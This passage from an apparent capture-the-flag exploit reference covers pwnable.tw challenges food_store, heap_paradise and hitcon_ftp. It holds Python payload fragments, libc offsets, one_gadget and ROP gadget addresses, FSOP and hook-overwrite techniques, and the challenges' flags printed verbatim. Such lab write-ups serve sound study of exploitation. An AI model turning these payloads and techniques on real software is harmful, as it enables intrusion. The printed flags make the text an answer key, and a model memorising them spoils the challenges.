1. **Heap + libc leak:** Same as Path A (uninitialized `next` → bin pointer leaks).
2. **Write-what-where:** The uninitialized-next primitive gives the ability to write a heap pointer to any address containing a zero. Target `_dl_open_hook` (a function pointer table used during `dlopen`/abort).
3. **Trigger abort:** Free an invalid/fake chunk address → glibc detects corruption → calls `__libc_message` → `backtrace` → `_dl_open_hook->dlopen_mode()` → controlled call.
4. **Pivot + `gets`:** The controlled call targets a gadget like `call [rax+0x48]` with `gets` at that offset. `gets()` reads an ORW ROP chain onto the stack/heap → flag.

---

##### Path C — Uninitialized `next` → `__realloc_hook` = `leave; ret` → Stack Pivot → ORW ROP

**Used by:** Solutions 8153, 37709

1. **Leak heap + libc** via the same uninitialized-next technique.
2. **Link `__realloc_hook - 0x80` into the recipe list.** Use `remove_recipe()` unlink to write `leave; ret` gadget to `__realloc_hook`.
3. **Prepare ROP payload** in a heap region (recipe names + `gets` address).
4. **Trigger `realloc(ptr, 0)`:** The `remove_recipe` internally calls `realloc` → `__realloc_hook` fires → `leave; ret` pivots rsp to a heap-based ROP chain containing `gets`.
5. **`gets` reads the final ORW ROP** → `read(3, heap, 0x100)` + `write(1, heap, 0x100)` → flag.

---

##### Path D — Unsorted Bin Attack → Corrupt `stdin->_IO_buf_end` → Stack Overwrite → ORW ROP

**Used by:** Solutions 1351, 755

1. **Leak heap + libc** via uninitialized-next.
2. **Unsorted bin attack:** Corrupt unsorted bin `bk` to point to `stdin->_IO_buf_end - 0x10`. Next allocation from the unsorted bin writes `main_arena` address over `_IO_buf_end`, extending stdin's internal buffer to cover a large writable region.
3. **Stack leak:** Use the extended stdin buffer or read `__environ` via fake recipe to leak a stack address.
4. **Overwrite stack via stdin:** The next `scanf` reads past the original buffer boundary, writing directly onto the stack. Inject a `leave; ret` + ORW ROP chain into the return address region.
5. **Return → ROP → flag.**

---

##### Path E — FSOP via `fclose` on Flag FILE → `_IO_str_overflow` → `setcontext` → ORW ROP

**Used by:** Solutions 821, 36997, 2972

1. **Leak heap + libc** via uninitialized-next.
2. **Free the flag FILE struct:** Point the fake recipe list at the `FILE *` for the pre-opened flag (on the heap). `remove_recipe()` frees it into the unsorted bin.
3. **Reallocate over the freed FILE:** Use `make_ingredient` (shop menu) to allocate chunks that overlap the freed FILE struct. Forge a fake `_IO_FILE_plus` with:
   - Vtable pointing to `_IO_str_jumps - 0x10` (so `__overflow` slot → `setcontext+0x35`)
   - `_IO_buf_base` set to heap address containing ROP chain
4. **Trigger `fclose` or `exit`:** The program calls `fclose(f_flag)` on exit → `_IO_OVERFLOW` dispatches through the fake vtable → `setcontext` pivots stack → ORW ROP → flag.

---

##### Path F — Modify `stdin->fd` from 0 to 3 → `scanf` Reads Flag Directly

**Used by:** Solution 408

1. **Leak heap + libc** via uninitialized-next + ingredient type confusion.
2. **Corrupt ingredient pointer:** Make an ingredient whose address overlaps with `stdin->fd - 0x24` (so that the ingredient's `quantity` field aliases `stdin->fd`).
3. **Increment `stdin->fd`:** Visit the shop to trigger a "restock" operation that increments the quantity field, changing fd from 0 to 3.
4. **`scanf("%23s")` in `add_recipe`** now reads from fd 3 (the flag file) instead of stdin → flag becomes the recipe name → printed by `show_recipe()`.

**Elegance:** This path avoids ROP entirely — one byte change to `stdin->fd` makes the flag appear as a recipe title.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Uninitialized `recipe->next` | V1: stale heap data in malloc'd 0x90 chunk | Deterministic (with careful heap feng shui) |
| Arbitrary address in linked list | V1 applied: control `next` via prior allocation | After heap layout control |
| Heap address leak | Fake list entry → printed as recipe title | Deterministic |
| Libc leak | Unsorted/large bin fd/bk in fake recipe | Deterministic |
| Arbitrary free | `remove_recipe()` on fake list entry | After list corruption |
| Code execution | `__free_hook`/`__realloc_hook`/`_dl_open_hook`/FSOP | Deterministic after leaks |
| Flag read | ORW ROP (seccomp blocks execve) | Deterministic |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `370.md` | A | Uninit next → large bin leak → `__realloc_hook` + `setcontext` → ORW | Uses ctypes to predict RNG for assignment timing |
| `821.md` | E | Uninit next → free flag FILE → FSOP `_IO_str_overflow` → `setcontext` | Frees `f_flag` FILE struct, forges vtable |
| `2311.md` | B | Uninit next → `_dl_open_hook` → abort trigger → `gets` → ORW | Writes heap ptr to `_dl_open_hook`, triggers via bad free |
| `755.md` | D | Uninit next → unsorted bin attack → corrupt `stdin->_IO_buf_end` → stack ROP | Extends stdin buffer to overwrite stack |
| `408.md` | F | Ingredient type confusion → modify `stdin->fd` 0→3 → scanf reads flag | Elegant: no ROP, flag becomes recipe title |
| `1351.md` | D | Uninit next → unsorted bin attack → stdin corruption → stack overwrite | Similar to 755 with different layout |
| `8033.md` | A | Uninit next → `__free_hook` = `gets` → stack pivot → ORW | Overwrites `__free_hook` with `gets`, then reads ROP |
| `8153.md` | A | Uninit next → `__free_hook` = `setcontext` → ORW | Clean implementation of Path A |
| `9251.md` | B + C | Uninit next → `_dl_open_hook` → `setcontext` → `gets` → ORW | Uses `authdes_marshal` gadget for call primitive |
| `22319.md` | B | Uninit next → `_dl_open_hook` → `setcontext+53` → `gets` → ORW | Leaked libc from `_IO_2_1_stderr_` on heap |
| `31599.md` | A | Uninit next → large bin leak → `__free_hook` via unlink → `setcontext` → ORW | Detailed, creates ORW spread across recipe titles |
| `36134.md` | B | Uninit next → `_dl_open_hook` → `gets` → ORW | Made custom ingredient for high price/power exploit |
| `36997.md` | E | Uninit next → free flag FILE → FSOP → `setcontext` → ORW | `_IO_str_overflow` with fake vtable |
| `37709.md` | C | Uninit next → `__realloc_hook` = `leave; ret` → heap pivot → `gets` → ORW | Stack pivot via `leave; ret` in `__realloc_hook` |
| `2972.md` | E | Uninit next → free flag FILE → FSOP `_IO_str_overflow` → `setcontext` | Similar to 821, heap spray for FILE overlap |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (socket-based, pipelined for 60s alarm) |
| `desc.txt` | Challenge description |
| `artifacts/food_store` | Original challenge binary |
| `solution/*.md` | Community write-ups (15 solutions) |

## heap_paradise
> **Canonical route:** Slot-not-cleared double free → Fastbin dup, fake chunks, stdout/stderr FILE vtable, and hooks
> **Read this case when:** `free` never clears the allocation slot, allowing repeated frees.
> **Primary defect:** Slot-not-cleared double free
> **Exploit primitive/result:** Fastbin dup, fake chunks, stdout/stderr FILE vtable, and hooks
> **Search terms:** paradise; double free; fastbin dup; stdout vtable; stderr; partial overwrite
> **Version/protection clue:** Case target `heap_paradise` — x86-64, glibc 2.23, Full RELRO, canary/NX/PIE, FORTIFY
> **Variant boundary:** Standalone; choose stdout/stderr variants by libc validation and brute-force tolerance.

### Metadata

- Source title: Heap Paradise — pwnable.tw (350 pts)
- Source callout: `nc chall.pwnable.tw 10308`
- Source note: >
- Source callout: Flag: `FLAG{W3lc0m3_2_h3ap_p4radis3}`

```yaml
tags:
  - off-by-null
  - fastbin-dup
  - io-file-exploit
platform: pwnable.tw
points: 350
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "An off-by-null single-byte overflow enables fastbin consolidation and duplicate allocation without a show function, leaking libc via _IO_2_1_stdout_."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A minimalist heap menu binary (x86-64, Full RELRO, PIE, NX, Canary, FORTIFY) built against glibc 2.23 (no tcache). The menu provides only Allocate, Free, and Exit — **no view/print functionality**. All allocations are capped at `size <= 0x78`, restricting everything to the fastbin range. A global pointer array `ptr[16]` in `.bss` holds up to 16 allocations (slots are never reused after free).

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO         # GOT not writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
```

#### Vulnerabilities

##### V1 — Use-After-Free / Double-Free (Primary, Exploitable)

**Root Cause:** The `Free` function calls `free(ptr[index])` but **never sets `ptr[index]` to NULL**. Since slots are never cleared, the same index can be freed multiple times, and freed pointers remain accessible for re-allocation overlap.

```c
void Free() {
    long index = get_long();
    if (index <= 15)
        free(ptr[index]);     // ptr[index] NOT cleared → UAF + double-free
}
```

**Impact:** Classic fastbin double-free primitive. Enables fastbin duplication (A→B→A cycle) which leads to overlapping allocations and arbitrary fastbin fd pointer corruption.

##### V2 — Signed Index Check (Minor, Unexploited)

The free index check uses `index <= 15` on a signed long. Negative indices could theoretically free arbitrary BSS pointers, but no solution uses this since the pointer array is at the start of writable BSS with nothing useful before it.

#### Key Constraints

| Constraint | Impact |
|-----------|--------|
| `size <= 0x78` | All chunks are fastbin-sized (max chunk `0x80`). Cannot directly get unsorted bin libc pointers. |
| No view/print | Cannot read heap contents through the menu. Must use side-channel (FSOP stdout leak). |
| 16 slot limit | Slots are consumed on alloc, never reclaimed. Must complete exploit within 16 allocations total. |
| Full RELRO | GOT is read-only. Must use hook-based (`__malloc_hook` / `__free_hook`) or FSOP attacks. |

#### Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
_IO_2_1_stdout_ = 0x3c4620
_IO_2_1_stdin_  = 0x3c38e0
_IO_2_1_stderr_ = 0x3c4540
__malloc_hook   = 0x3c3b10    # main_arena = __malloc_hook + 0x10
__free_hook     = 0x3c57a8
system          = 0x45390
one_gadgets     = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
```

### Exploit Paths

#### Exploit Paths

All solutions follow a three-phase structure: (1) get a libc pointer onto the heap, (2) leak libc, (3) hijack control flow. They differ in leak technique and final target.

---

##### Path A — Fastbin Dup → Fake Unsorted Chunk → stdout FSOP Leak → `__malloc_hook` Overwrite

**Used by:** ~90% of all solutions (81, 138, 216, 378, 564, 821, 1177, 2796, 5378, 7905, 8153, 9448, 13204, 17704, 22310, 26250, 31599, 34817, 40311, and exp.py)

**Phase 1 — Plant libc pointer on heap:**

1. **Fastbin dup** (double-free A→B→A) to get overlapping chunks. By writing a partial heap address as the `fd` pointer, allocate a chunk that overlaps another, gaining control over an adjacent chunk's size field.

2. **Forge a fake chunk** with `size >= 0x80` (typically `0xa1` or `0x91`) in the overlapping region. This size is above the fastbin max, so freeing it sends it to the **unsorted bin**.

3. **Free the forged chunk** → glibc writes `main_arena+0x58` (a libc address) into the chunk's `fd`/`bk` fields on the heap.

```python
# Typical Phase 1 pattern:
alloc(0x68, b'f'*0x10 + p64(0) + p64(0x71))        # 0 — embed fake chunk header
alloc(0x68, b'a'*0x10 + p64(0) + p64(0x31) + ...)   # 1 — embed fake next-chunk
free(0); free(1); free(0)                             # fastbin dup: 0→1→0
alloc(0x68, b'\x20')                                  # redirect fd to heap+0x20
alloc(0x68, b'\0'); alloc(0x68, b'\0')                # consume chain
alloc(0x68, b'\0')                                    # land on fake chunk at heap+0x20
free(0)
alloc(0x68, b'd'*0x10 + p64(0) + p64(0xa1))          # overwrite fake chunk size → 0xa1
free(5)                                               # → unsorted bin → libc ptr on heap
```

**Phase 2 — Leak libc via `_IO_2_1_stdout_` corruption (FSOP):**

4. The unsorted bin remainder (after splitting) or the freed chunk itself contains a `main_arena` pointer in its `fd` field. Using another fastbin dup, **partially overwrite** (2 bytes) this `fd` pointer to redirect it to `_IO_2_1_stdout_ - 0x43`.

5. At `stdout - 0x43`, the byte at offset `+0x8` is `0x7f` (from adjacent libc data), which passes glibc 2.23's fastbin size check for the `0x70` bin.

6. Allocate at `stdout - 0x33` and overwrite the `_IO_FILE` structure:
   - `_flags = 0xfbad1800` (or `0xfbad3887`) — set `_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING`
   - Clear `_IO_read_*` pointers
   - Set `_IO_write_base` low byte to `0x00` or `0x80` — ensures `_IO_write_base < _IO_write_ptr`

7. The next `puts()` call flushes `[_IO_write_base, _IO_write_ptr)`, **leaking libc pointers** from the stdout internal buffer (typically `_IO_2_1_stdin_` address).

```python
# Partial overwrite: only low 2 bytes known, bits 12-15 are guessed → 1/16 probability
low2 = p16((_IO_2_1_stdout_ - 0x43) & 0xFFFF)  # e.g., 0x25dd or 0x45dd
alloc(0x68, padding + p64(0x71) + low2)           # partial overwrite fd
alloc(0x68, b'\0')                                 # consume
alloc(0x68, b'\0'*3 + p64(0)*6 + p64(0xfbad1800) + p64(0)*3 + b'\x00')  # corrupt stdout
# → next puts() leaks libc
```

**Phase 3 — Overwrite `__malloc_hook` with one_gadget:**

8. With full libc base known, do a final fastbin dup. Set `fd = __malloc_hook - 0x23` (where offset `+0x8` has byte `0x7f` from `main_arena` data → passes fastbin size check).

9. Allocate at `__malloc_hook - 0x13`, write `0x13` bytes padding + `p64(one_gadget)` to overwrite `__malloc_hook`.

10. Trigger `malloc()` (send menu choice "1" + any size) → `__malloc_hook` fires → `execve("/bin/sh")` → shell.

```python
alloc(0x68, p64(__malloc_hook - 0x23))             # poison fastbin fd
alloc(0x68, b'\0')                                  # consume
alloc(0x68, b'\0')                                  # consume
alloc(0x68, b'\0'*0x13 + p64(one_gadget))           # overwrite __malloc_hook
# trigger:
sendline("1"); sendline("8")                        # malloc() → one_gadget → shell
```

**Reliability:** The Phase 2 partial overwrite requires guessing 1 nibble of ASLR (bits 12-15 of libc base). Success rate is **1/16 per connection** (~6.25%). Solutions wrap the exploit in a retry loop.

---

##### Path B — FSOP via `_IO_2_1_stderr_` vtable hijack (Leakless)

**Used by:** Solution 2311

Instead of leaking libc and then doing a second fastbin attack, this approach performs **two** partial-overwrite fastbin attacks (both 1/16 probability each, so overall ~1/256):

1. First fastbin attack targets `_IO_2_1_stderr_`, overwrites its `_flags` to `";sh\0"` and partially overwrites `_IO_write_base` to point to `system`.

2. Second fastbin attack targets the middle of `stderr`, partially overwrites the **vtable pointer** to point to the crafted `system` address.

3. Trigger `_IO_flush_all_lockp` (via a deliberate double-free abort). The flushing code calls `stderr->vtable->__overflow(stderr)` which resolves to `system(stderr)`, and since `stderr->_flags` starts with `";sh\0"`, the shell command executes.

**Reliability:** ~1/256 per connection (two independent 1/16 guesses). Much slower than Path A but requires no leak at all.

---

##### Path C — stdout vtable overwrite via `__free_hook`

**Used by:** Solutions 331, 378, 564, 821

A variant where after leaking libc via the stdout FSOP (same as Path A Phase 2), the exploit:

1. Uses a fastbin dup to allocate near `_IO_2_1_stdout_`'s vtable region.
2. Overwrites the vtable pointer or `__overflow` entry to point to `system`.
3. Triggers output (e.g., via menu prompt) which calls through the corrupted vtable → `system("/bin/sh")` or `system(stdout)` where `_flags` contains `";sh"`.

Alternative finish: Some solutions target `__free_hook` instead of `__malloc_hook`:

```python
# unsorted bin attack to write main_arena near __free_hook → create fake fastbin chunk
alloc(0x78, p64(0)*11 + p64(0x71) + p64(__free_hook - 0x33))
alloc(0x68, b"/bin/sh\x00")           # this chunk's content = "/bin/sh"
alloc(0x68, padding + p64(system))     # overwrite __free_hook
free(idx_of_binsh_chunk)              # free("/bin/sh") → system("/bin/sh")
```

---

##### Path D — Double-Free Abort Triggers `__malloc_hook`

**Used by:** Solutions 17704, 31599, 34817

After overwriting `__malloc_hook` with one_gadget, instead of sending a normal malloc menu choice, trigger a **deliberate double-free**. The glibc abort handler internally calls `malloc()` (for error message formatting), which fires `__malloc_hook` → one_gadget → shell.

```python
# After __malloc_hook = one_gadget:
free(0); free(0)   # double-free → abort → malloc() internally → __malloc_hook → shell
```

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Double-free (fastbin dup) | V1: UAF / no pointer clear | Deterministic |
| Heap overlap / chunk forge | Fastbin dup + partial fd write | Deterministic |
| Fake unsorted bin chunk | Overlap → write size ≥ 0x80 → free | Deterministic |
| libc pointer on heap | Unsorted bin free writes main_arena | Deterministic |
| stdout FSOP leak | Partial overwrite fd → stdout-0x43 | 1/16 (nibble guess) |
| `__malloc_hook` overwrite | Fastbin dup → malloc_hook-0x23 (0x7f) | Deterministic after leak |
| Code execution | one_gadget via `__malloc_hook` or `system` via `__free_hook` | Deterministic after overwrite |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `81.md` | A | Fastbin dup → unsorted → stdout FSOP → `__malloc_hook` | Clean minimal exploit |
| `138.md` | A | Ruby exploit; same three-phase approach | Uses `_IO_2_1_stderr_+157` as fake chunk |
| `216.md` | A | Fastbin dup → stdout FSOP → `__malloc_hook` | Standard pattern |
| `331.md` | C | stdout FSOP → vtable overwrite → `system` | Hijacks stdout vtable instead of hooks |
| `378.md` | C | stdout vtable + FSOP → `system` via vtable | Uses `";sh"` in `_flags` |
| `564.md` | A+C | stdout FSOP → vtable overwrite + one_gadget | Two-stage vtable/hook approach |
| `821.md` | A+C | stdout FSOP → `__free_hook` via unsorted bin attack | Uses unsorted bin attack for `__free_hook` |
| `1177.md` | A | Fastbin dup → stdout FSOP → `__malloc_hook` | Local process exploit |
| `2311.md` | B | **Leakless**: dual partial overwrite → stderr vtable → `_IO_flush_all_lockp` | ~1/256 brute; no libc leak needed |
| `2796.md` | A | Standard three-phase | Concise implementation |
| `5378.md` | A | stdout FSOP → `__malloc_hook` | `FLAG{W3lc0m3_2_h3ap_p4radis3}` confirmed |
| `7905.md` | A | Detailed Chinese writeup; full phase breakdown | Best pedagogical write-up |
| `8153.md` | A | Chinese writeup; clean overlap analysis | Notes signed index bug |
| `9448.md` | A | Standard approach with retry loop | Clear heap layout diagrams |
| `13204.md` | A | Minimal exploit with retry decorator | Uses `0x3c3aed` for `__malloc_hook` fake chunk |
| `17704.md` | A+D | stdout FSOP → `__malloc_hook` → double-free abort trigger | Abort path for trigger |
| `22310.md` | A | Standard three-phase with bruteforce | Uses `0x45dd` partial overwrite |
| `26250.md` | A | Standard three-phase | Detailed heap layout comments |
| `31599.md` | A+D | stdout FSOP → `__malloc_hook` → double-free abort | Heap diagram in comments |
| `34817.md` | A | "fake unsortedbin, angelboy's leak, hijack malloc hooks" | Clean final exploit |
| `40311.md` | A | Standard three-phase; clean Python3 | Retry loop, concise |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (self-contained, no pwntools dependency) |
| `desc.txt` | Challenge description |
| `solution/*.md` | Community write-ups (71 solutions) |

## hitcon_ftp
> **Canonical route:** Filename leak, OACK OOB read, and negotiated block-size stack overflow → Heap pivot/mprotect/shellcode or seccomp-constrained ORW ROP
> **Read this case when:** A UDP/msgpack TFTP service leaks FILE data and accepts oversized OACK/block-size fields.
> **Primary defect:** Filename leak, OACK OOB read, and negotiated block-size stack overflow
> **Exploit primitive/result:** Heap pivot/mprotect/shellcode or seccomp-constrained ORW ROP
> **Search terms:** TFTP; UDP; msgpack; OACK; `blksize`; CRC32; seccomp; SIGALRM
> **Version/protection clue:** Case target `hitcon_ftp` — x86-64, glibc 2.27, Full RELRO, canary/NX/PIE, UDP/msgpack, seccomp
> **Variant boundary:** Standalone; preserve UDP/TFTP and 60-second timeout constraints in every plan.

### Metadata

- Source title: HITCON FTP — pwnable.tw (500 pts)
- Source callout: Nobody find all vulnerabilities in HITCON CTF final 2019. :'(
- Source note: >
- Source callout: `nc chall.pwnable.tw 10309`
- Source note: >
- Source callout: Flag: `FLAG{c4ptur3_th3_f0rtun3_by_h1tc0n_ftp}`

```yaml
tags:
  - heap-buffer-overflow
  - seccomp-bypass
  - rop
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.27
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "Heap corruption in msgpack packet deserialization allows hijacking execution under seccomp, constructing an open-read-write ROP chain."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A custom TFTP-like server (x86-64, Full RELRO, Canary, NX, PIE) running over UDP, using msgpack for packet serialization. The server allocates a UDP port per connection, parses msgpack arrays as commands (RRQ=1, WRQ=2, DATA=3, ACK=4, ERR=5, OACK=6), and supports file read/write with CRC32 verification and block size negotiation. A seccomp sandbox restricts syscalls to file I/O, networking (socket/sendto/recvfrom/bind), memory management (mmap/mprotect/brk), and select. The main loop runs under a `SIGALRM` timer (~60s); when it fires, `select()` fails and `main()` returns.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT read-only
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  Seccomp:  Allowlist (open, read, write, close, stat, fstat, lseek,
            ioctl, openat, brk, mmap, mprotect, select, socket,
            sendto, recvfrom, bind, rt_sigreturn, exit, exit_group)
```

#### Vulnerabilities

##### V1 — Heap Address Leak via Non-Terminated Filename (Info Leak)

**Root Cause:** The request struct stores `filename` in a 0x100-byte buffer. When the server receives a filename containing `"../"`, it rejects the access and formats an error message using `snprintf` with the full filename. If the filename is exactly 0x100 bytes, `strncpy` does not NUL-terminate it, and the adjacent `FILE *fp` pointer in the struct is concatenated into the error response.

```c
// Simplified: filename is 0x100 bytes, FILE* follows immediately
struct Request {
    // ...
    char filename[0x100];   // +0x010
    FILE *fp;               // +0x110
    // ...
};
strncpy(req->filename, via.str.ptr, via.str.size);  // no NUL if size == 0x100
// error path:
snprintf(buf, ..., "file (%s) access violation", req->filename);
// leaks fp pointer bytes after the filename
```

**Trigger:** Send a first WRQ to initialize `fp`, then send a RRQ with `"../".ljust(0x100, "A")` as filename. The error response includes the `FILE*` heap pointer appended after the 'A' padding.

**Impact:** Leaks a heap address. Heap base = `leaked_ptr - 0x22ad0`.

##### V2 — Type Confusion in OACK Options Processing (Arbitrary Read)

**Root Cause:** When processing RRQ/WRQ packets, the server checks if `array[3]` is a `MSGPACK_OBJECT_MAP` — but **only when `array.size == 4`**. If the array has 5+ elements, the check is skipped entirely, and `array[3]` of any type is interpreted as a map of `msgpack_object_kv` entries.

```c
// Simplified condition — note the short-circuit with ==4
if (via.array.size == 4 && via.array.ptr[3].type != MSGPACK_OBJECT_MAP)
    return error;
// When array.size >= 5, array[3] passes unchecked
```

By sending a string or raw bytes as `array[3]`, the attacker controls the in-memory layout interpreted as `msgpack_object_kv` structs. A fake entry with `key.type = MSGPACK_OBJECT_STR`, `key.ptr = target_address`, and `val.type = MSGPACK_OBJECT_POSITIVE_INTEGER` causes the server to read memory at `target_address` and include it as an OACK option key in the response.

**Trigger:**
```python
fake_kv = p64(5) + p64(0x3f) + p64(target_addr) + p64(2) + p64(0x1337)
send([1, "flag", "octet", fake_kv, "pad"])  # array size=5, bypasses check
# Response: OACK with key = memory_at_target_addr (up to 63 bytes)
```

**Impact:** Arbitrary read of up to 63 bytes at any address. Used to leak libc (via `_IO_file_jumps` or GOT), stack (via `environ`), PIE base, and canary.

##### V3 — Stack Buffer Overflow in `check_crc32` / `msgpack_object_print_buffer` (Code Execution)

**Root Cause:** The CRC32 verification function calls `msgpack_object_print_buffer(error_buf, payload_len, obj)` where `error_buf` is a 0x204-byte stack buffer but `payload_len` is controlled via the negotiated `blksize` option (up to 0xFFFF). When `blksize` is set large, `snprintf` writes the string representation of the msgpack data object far past the buffer boundary, overwriting the canary, saved RBP, and return address of `main()`.

```c
// check_crc32 — simplified
char error_buf[0x204];  // stack buffer
// obj_len comes from the DATA packet's payload length (controlled via blksize)
msgpack_object_print_buffer(error_buf, obj_len, data_obj);
// snprintf inside print_buffer writes string repr of data_obj to error_buf
// If obj_len > 0x204, this overflows the stack
```

**Complication:** Since `snprintf` is used internally, NUL bytes cannot be written directly. Solvers work around this by writing the payload in reverse order — each write uses `snprintf`'s automatic NUL terminator to place zeros at decreasing offsets.

**Impact:** Full stack buffer overflow. Combined with leaked canary, enables ROP chain or stack pivot.

#### Execution Trigger

The SIGALRM handler does **not** call `exit()`. Instead, the signal interrupts `select()`, which returns `-1` (EINTR), causing the main loop to break and `main()` to return — into the attacker's ROP chain. All solutions must wait ~60 seconds for this to happen.

#### Key Offsets (remote libc, glibc 2.27)

```python
# libc gadgets
pop_rdi     = 0x2155f
pop_rsi     = 0x23e6a
pop_rdx     = 0x1b96
pop_rax     = 0x439c8
pop_rsp     = 0x3960
pop_rdx_r10 = 0x1306b4
syscall_ret = 0xd2975
leave_ret   = 0x54803

# libc symbols / offsets
_IO_file_jumps = 0x3e82a0
_IO_2_1_stderr = 0x3ec680
environ        = 0x3ee098
mprotect       = 0x11bae0

# Binary internals
request_delta  = 0x13b10   # from heap base to first request struct
send_data      = 0x257e    # PIE offset: function to send data via TFTP
send_err       = 0x2855    # PIE offset: function to send error via TFTP
flag_path_bss  = 0x20d160  # PIE offset: "/home/hitcon_ftp/flag" if stored via OACK
```

#### Seccomp Policy

Allowlist: `rt_sigreturn`, `exit_group`, `exit`, `open`, `read`, `write`, `close`, `stat`, `fstat`, `lseek`, `ioctl`, `openat`, `brk`, `mmap`, `mprotect`, `select`, `socket`, `sendto`, `recvfrom`, `bind`. All others → KILL.

This blocks `execve`, so all exploits must use open/read + sendto to exfiltrate the flag.

### Exploit Paths

#### Exploit Paths

All 20 solutions use the same three-bug chain (V1 → V2 → V3). They differ in the leak chain specifics and the final payload strategy.

---

##### Path A — Stack Pivot to Heap → mprotect + Shellcode (Most Common)

**Used by:** Solutions 370, 821, 2972, 5586, 8153, 31599, 34306, 35463, 36997

1. **V1:** Leak heap via overlong `"../"` filename.
2. **V2:** Leak libc (`_IO_file_jumps` or `_IO_2_1_stderr_` from FILE struct on heap), stack (`environ`), canary (stack+offset+1, skip leading NUL), and optionally PIE base.
3. **V3:** Set `blksize` to 0xFFFF. Repeatedly overflow `check_crc32`'s stack buffer to write backwards:
   - Restore canary (write bytes 1-7, then NUL-terminate byte 0)
   - Overwrite saved RBP with pointer to `datain` buffer (heap) or a controlled region
   - Overwrite return address with `leave; ret` gadget (stack pivot)
4. **Send ROP chain to `datain` buffer:** `pop rdi; heap_page; pop rsi; 0x1000; pop rdx; 7; mprotect; shellcode_addr`
5. **Shellcode:** `open("/home/hitcon_ftp/flag") → read(fd, buf, 0x100) → sendto(0, buf, len, 0, saved_sockaddr, 16)` — sends flag back over UDP to the attacker's address (extracted from the request struct on heap).
6. **Wait ~60s** for SIGALRM → `select()` fails → `main()` returns into ROP.

##### Path B — Direct ROP Chain on Stack (No Shellcode)

**Used by:** Solutions 3578, 6748, 28605, 28652, 34817, 36134

Same leak chain, but instead of pivoting:
1. Write the full ROP chain directly onto `main()`'s stack frame via repeated `check_crc32` overflows.
2. ROP: `open(flag_path) → read(fd, buffer, N) → sendto(0, buffer, N, 0, sockaddr, 16)` using libc gadgets and syscall.
3. Some variants call the binary's own `send_err()` / `process_send()` function (at PIE+0x2855 or similar) to send the flag through the existing TFTP protocol.

##### Path C — `close(3) + open(flag)` → Reuse Existing FILE (Clever Variant)

**Used by:** Solution 6748

1. ROP chain does: `close(3)` (the server's open file descriptor), then `open("/home/hitcon_ftp/flag")` which reuses fd 3.
2. Then calls the binary's own `process_send(request)` function, which reads from the FILE associated with fd 3 — now pointing to the flag file — and sends the data back through normal TFTP protocol.

##### Path D — CRC32 Brute-Force for Initial Leak (No V1 Needed)

**Used by:** Solutions 9251, 11177, 33090, 34817

Instead of using V1 for the heap leak:
1. Exploit the `strlen()` in `check_crc32` — the CRC is computed on the buffer up to the first NUL byte. By padding to known stack offsets and brute-forcing one byte at a time (256 attempts per byte), the attacker can determine stack values by checking whether `CRC32(padding + guess_byte) == expected`.
2. Brute-force 4-5 bytes of a stack pointer (only ~5×256 = 1280 packets). This gives a code/PIE base address.
3. Then use V2 for remaining leaks (libc, canary, heap) and V3 for the overflow.

**Downside:** Slower (~1280 round-trips vs. 1 for V1), requires low-latency connection. Some solvers ran from Japan VPS to avoid timeout.

##### Path E — Canary Leak via TLS/ld.so (Alternative to Stack Canary Leak)

**Used by:** Solution 3498

Instead of leaking the canary from the stack:
1. Use V2 to read `_rtld_global` from libc → get `ld.so` base → read TLS block → extract canary from `tcbhead_t.stack_guard` (at TLS+0xba8 or similar offset).
2. This avoids needing to know the exact stack layout for canary position.

##### Path F — Auxv Walk for PIE + Canary (exp.py approach)

**Used by:** exp.py (the reference exploit in this directory)

1. **V1:** Leak heap via msgpack ExtType trick (send many map keys to cause realloc, then parse leaked key from reused memory).
2. **V2:** Read `FILE*` from request struct → `_IO_file_jumps` → libc base. Read `environ` → stack. Walk `envp[]` until NUL → find `auxv[]`. Parse `AT_PHDR` → PIE base. Parse `AT_RANDOM` → read 16-byte random blob → extract canary (first 8 bytes, mask low byte to 0).
3. **V3:** Build ROP chain image, split at NUL bytes into stages. Each stage is sent as a WRQ+DATA pair; `snprintf`'s NUL terminator handles the zero bytes. ROP: `open(flag) → read(3, buf, 0x80) → send_data(request, buf, 0x80) → exit(0)`.

#### Leak Primitives Summary

| What | How | Source |
|------|-----|--------|
| Heap base | V1: `"../"` filename overflow leaks `FILE*` | All solutions except Path D |
| Heap base (alt) | V3: CRC32 brute-force of stack pointers → V2 read | Path D solutions |
| libc base | V2: Read `_IO_file_jumps` / `_IO_2_1_stderr_` / GOT entry from heap or binary | Universal |
| Stack address | V2: Read `libc.environ` | Universal |
| PIE base | V2: Read return address from stack, or V3: CRC32 brute | Most solutions |
| Stack canary | V2: Read `stack_addr - offset + 1` (skip NUL byte 0) | Most solutions |
| Canary (alt) | V2: Read TLS `stack_guard` via `_rtld_global` chain | Solution 3498 |
| Canary (alt) | V2: Read `AT_RANDOM` from auxv, first 8 bytes | exp.py |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `370.md` | A | Heap leak → mprotect + shellcode (sendto via saved sockaddr) | Clean, uses pwntools shellcraft |
| `821.md` | A | mprotect + handcrafted shellcode | Detailed DATA_HDR constants, finds datain buffer |
| `2972.md` | A | mprotect + jmp rsp shellcode | Uses `jmp rsp` gadget after mprotect |
| `3498.md` | A + E | Canary via TLS (_rtld_global chain) | Alternative canary leak path |
